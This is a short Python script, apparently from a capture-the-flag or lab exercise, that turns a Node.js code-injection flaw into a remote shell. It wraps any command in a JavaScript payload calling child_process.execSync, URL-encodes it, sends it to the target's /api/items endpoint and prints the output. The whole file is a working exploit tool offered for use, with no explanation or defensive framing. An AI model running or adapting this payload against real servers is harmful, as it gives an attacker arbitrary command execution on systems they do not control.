#!/usr/bin/env python3
"""Helper to execute commands via the RCE vulnerability"""
import requests
import urllib.parse
import sys

target = "http://10.66.147.196"

def run(cmd):
    payload = f"(function(){{try{{return require('child_process').execSync({repr(cmd)}).toString()}}catch(e){{return e.stdout ? e.stdout.toString() : e.message}}}})()"
    encoded = urllib.parse.quote(payload)
    try:
        r = requests.post(f"{target}/api/items?cmd={encoded}", timeout=30)
        if "vulnerability_exploited" in r.text:
            print(r.text.split("vulnerability_exploited", 1)[1].strip())
        elif "there_is_a_glitch" in r.text:
            print("NO OUTPUT")
        else:
            print(r.text)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        run(" ".join(sys.argv[1:]))
    else:
        for line in sys.stdin:
            run(line.strip())
